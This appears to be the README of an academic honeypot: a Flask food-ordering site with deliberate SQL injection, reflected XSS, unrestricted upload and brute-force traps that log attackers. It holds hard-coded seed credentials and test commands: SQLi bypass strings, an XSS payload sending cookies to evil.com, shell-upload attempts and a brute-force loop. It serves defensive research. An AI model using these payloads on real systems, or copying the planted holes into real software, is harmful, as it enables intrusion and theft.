# 🔥 SpiceBite Honeypot — Food Website Disguised Security Trap

> ⚠️ **DISCLAIMER**: This is an academic cybersecurity project. Do NOT deploy in production without proper network isolation (VM, container, air-gapped lab). All vulnerabilities are intentional honeypot traps.

---

## 📁 Project Structure

```
honeypot/
├── app.py                   # Main Flask application (all routes + honeypot logic)
├── database.db              # SQLite database (auto-created on first run)
├── requirements.txt
├── templates/
│   ├── base.html            # Shared layout with navbar/footer
│   ├── index.html           # Homepage with hero + featured items
│   ├── category.html        # Menu category page
│   ├── cart.html            # Shopping cart
│   ├── checkout.html        # Payment form (fake)
│   ├── bill.html            # Order confirmation / receipt
│   ├── wishlist.html        # Saved items
│   ├── login.html           # 🪤 SQLi-vulnerable login
│   ├── reviews.html         # 🪤 File upload + XSS trap
│   ├── search.html          # 🪤 Reflected XSS in search
│   ├── admin_login.html     # 🪤 Brute force trap
│   ├── admin_dashboard.html # Attack analytics dashboard
│   └── 404.html             # Custom error page
├── static/
│   ├── css/style.css        # Full dark luxury aesthetic stylesheet
│   └── js/main.js           # Frontend JS + DevTools detection honeypot
├── uploads/                 # Uploaded files land here
└── logs/
    ├── glasstopf.json        # Glasstopf-compatible logs (JSONL)
    ├── cowrie.json           # Cowrie-compatible logs (JSONL)
    └── dionaea.json          # Dionaea-compatible logs (JSONL)
```

---

## 🛠️ Setup Instructions

### 1. Install Python dependencies

```bash
cd honeypot
pip install -r requirements.txt
```

### 2. Run the application

```bash
python app.py
```

The app runs at: **http://localhost:5000**

### 3. Initialize database

The DB is auto-created on first run. Pre-seeded users:
- `john` / `password123` (regular user)
- Admin panel: `superadmin` / `Sp!ceB1te@dm1n` at `/admin-login`

---

## 🌐 Key URLs

| URL | Purpose |
|-----|---------|
| `http://localhost:5000/` | Food website homepage |
| `http://localhost:5000/category/pizza` | Pizza menu |
| `http://localhost:5000/login` | 🪤 SQLi-vulnerable login |
| `http://localhost:5000/reviews` | 🪤 File upload + XSS trap |
| `http://localhost:5000/search?q=...` | 🪤 Reflected XSS search |
| `http://localhost:5000/admin-login` | 🪤 Brute force trap |
| `http://localhost:5000/admin-dashboard` | Attack analytics (login required) |
| `http://localhost:5000/api/debug` | 🪤 Hidden debug endpoint |

---

## 🗄️ Database Schema

```sql
-- Users table
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password TEXT,
    email TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- All attack events
CREATE TABLE attack_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    endpoint TEXT,
    attack_type TEXT,
    payload TEXT,
    user_agent TEXT,
    extra TEXT   -- JSON blob for extra metadata
);

-- Login form attempts (SQLi trap)
CREATE TABLE login_attempts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    username TEXT,
    password TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    success INTEGER DEFAULT 0,
    user_agent TEXT
);

-- File upload attempts
CREATE TABLE file_upload_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    filename TEXT,
    extension TEXT,
    suspicious INTEGER DEFAULT 0,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    user_agent TEXT,
    notes TEXT
);

-- Admin panel brute force log
CREATE TABLE admin_login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    username TEXT,
    password TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    user_agent TEXT,
    attempt_number INTEGER DEFAULT 1
);

-- Completed orders
CREATE TABLE orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id TEXT,
    items TEXT,      -- JSON
    total REAL,
    transaction_id TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    card_last4 TEXT
);
```

---

## 🧪 Example Attack Test Commands

### 1. SQL Injection (login form)

```bash
# Classic bypass
curl -X POST http://localhost:5000/login \
  -d "username=' OR '1'='1&password=' OR '1'='1"

# Comment bypass
curl -X POST http://localhost:5000/login \
  -d "username=admin'--&password=anything"

# UNION probe (will error, logs detected)
curl -X POST http://localhost:5000/login \
  -d "username=' UNION SELECT 1,2,3--&password=x"
```

### 2. Reflected XSS (search endpoint)

```bash
# Basic alert test
curl "http://localhost:5000/search?q=<script>alert('xss')</script>"

# Cookie theft probe
curl "http://localhost:5000/search?q=<img+src=x+onerror=document.location='http://evil.com/c='+document.cookie>"
```

### 3. Suspicious File Upload (reviews page)

```bash
# PHP shell upload attempt
curl -X POST http://localhost:5000/reviews \
  -F "review_text=Great food!" \
  -F "reviewer_name=Test" \
  -F "rating=5" \
  -F "attachment=@shell.php;type=image/jpeg"

# Bash script upload
curl -X POST http://localhost:5000/reviews \
  -F "review_text=Nice!" \
  -F "reviewer_name=Test" \
  -F "rating=4" \
  -F "attachment=@exploit.sh;type=image/png"
```

### 4. Admin Brute Force Simulation

```bash
# Rapid repeated attempts (triggers after 3)
for i in {1..10}; do
  curl -X POST http://localhost:5000/admin-login \
    -d "username=admin&password=pass$i"
  sleep 0.3
done
```

### 5. Debug Endpoint Probe

```bash
# Basic probe
curl "http://localhost:5000/api/debug"

# With tampering params
curl "http://localhost:5000/api/debug?cmd=ls&eval=1&secret=1&debug=true"
```

### 6. 404 Scanning (common attacker behavior)

```bash
for path in wp-admin phpmyadmin .env config.php admin backup; do
  curl -s -o /dev/null -w "%{http_code} $path\n" http://localhost:5000/$path
done
```

---

## 🛡️ Honeypot Integration Notes

### Glasstopf
Log format: `/logs/glasstopf.json` (one JSON object per line)
Compatible with Glasstopf's JSON report format.

### Cowrie
Log format: `/logs/cowrie.json` — uses `eventid` field matching Cowrie conventions.
To ingest: `cat logs/cowrie.json | cowrie-logviewer` (if installed)

### Dionaea
Log format: `/logs/dionaea.json` — mimics Dionaea's bistreport JSON format.

---

## 🎨 Design Notes

- **Aesthetic**: Dark luxury restaurant — deep forest greens, warm orange accents, Playfair Display serif
- **Responsive**: Mobile-first Bootstrap grid + custom CSS
- **Animations**: CSS keyframes (float, orbit, fadeUp, drift)
- **Charts**: Chart.js doughnut + bar charts on admin dashboard
- **Auto-refresh**: Admin dashboard refreshes every 10 seconds

---

## ⚠️ Security Notice

This application is designed for **controlled academic research environments only**.

It intentionally:
- Contains SQL injection vulnerabilities in the login form
- Accepts all file types in the upload form (logs suspicious ones)
- Reflects user input in search results (XSS trap)
- Logs all failed admin login attempts without rate limiting

**Never deploy on a public internet-facing server.**
